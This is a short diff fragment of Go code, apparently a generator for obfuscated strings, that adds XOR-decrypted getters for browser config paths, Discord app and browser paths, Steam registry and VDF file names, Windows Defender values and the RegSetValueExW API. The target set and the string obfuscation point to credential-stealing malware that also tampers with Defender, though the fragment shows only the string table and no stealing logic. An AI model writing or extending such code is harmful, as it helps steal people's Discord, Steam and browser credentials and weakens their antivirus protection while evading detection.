@@ -543,5 +543,13 @@ func getEnumDisplaySettingsWName() string      { return string(xor(encEnumDispla
 func getChangeDisplaySettingsExWName() string  { return string(xor(encChangeDisplaySettingsExWName, decryptionKey)) }
 func getFindWindowWName() string               { return string(xor(encFindWindowWName, decryptionKey)) }
 func getFindWindowExWName() string             { return string(xor(encFindWindowExWName, decryptionKey)) }
+
+func getBrowserConfigs() []string              { return decryptList(encBrowserConfigs) }
+func getDiscordApps() []string                 { return decryptList(encDiscordApps) }
+func getDiscordBrowserPaths() []string         { return decryptList(encDiscordBrowserPaths) }
+func getSteamRegPaths() []string               { return decryptList(encSteamRegPaths) }
+func getSteamVdfNames() []string               { return decryptList(encSteamVdfNames) }
+func getDefenderValues() []string              { return decryptList(encDefenderValues) }
+func getRegSetValueExWName() string            { return string(xor(encRegSetValueExWName, decryptionKey)) }
 `)
 }
